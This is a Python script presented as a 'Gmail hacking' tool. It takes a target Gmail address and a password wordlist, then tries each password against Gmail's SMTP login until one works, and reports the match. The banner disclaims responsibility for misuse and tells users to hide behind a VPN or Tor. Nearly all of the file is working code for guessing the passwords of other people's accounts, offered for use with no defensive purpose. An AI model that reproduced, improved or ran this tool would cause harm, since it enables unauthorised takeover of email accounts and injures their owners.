# *  Author  : KrishnaGupta
# *  GitHub  : https://github.com/GuptajiiHacker
# *  YouTub  : HackerGuptaji
# *  FacebooK: https://shorturl.at/KrishnaGupta
# *  License : MIT

import smtplib, sys, os, random
from os import system

OKGREEN = '\033[92m'
WARNING = '\033[0;33m'
FAIL = '\033[91m'
ENDC = '\033[0m'
LITBU = '\033[94m'
YELLOW = '\033[3;33m'
CYAN = '\033[0;36'
colors = ['\033[92m', '\033[91m', '\033[0;33m']
RAND = random.choice(colors)

GMAIL_PORT = '587'


# Krishna BANER
def artwork():
    print("\n")
    print('''\033[32m
      ██████╗  ███╗   ███╗  █████╗  ██╗ ██╗              
     ██╔════╝  ████╗ ████║ ██╔══██╗ ██║ ██║            
     ██║  ███╗ ██╔████╔██║ ███████║ ██║ ██║   
     ██║   ██║ ██║╚██╔╝██║ ██╔══██║ ██║ ██║            
     ╚██████╔╝ ██║ ╚═╝ ██║ ██║  ██║ ██║ ███████╗       
      ╚═════╝  ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╚══════╝  v1.1 Vip  
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝
 ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
 ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
 ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        
⚠️WARNING:I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
*******************************************************
* Author   : KrishnaGupta 
* GitHub   : https://github.com/GuptajiiHacker 
* YouTub   : HackerGuptajii
* Instagram: @its_vip_krishna_gupta
* password : passworld.txt
*************USE VPN OR TOR SERVICE********************
''')
artwork()
smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)

smtp.ehlo()
smtp.starttls()

user = input("While The Target Gmail Adress: ")
pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")

if pwd == '0':
    passswfile = "passworld.txt"

elif pwd == '1':
    print("\n")
    passswfile = input("Name The File Path (For Password List):")

else:
    print("\n")
    print("Invalid input! Terminaling...")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtp.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
        # Author  : KrishnaGupta 
        #thank you hackers
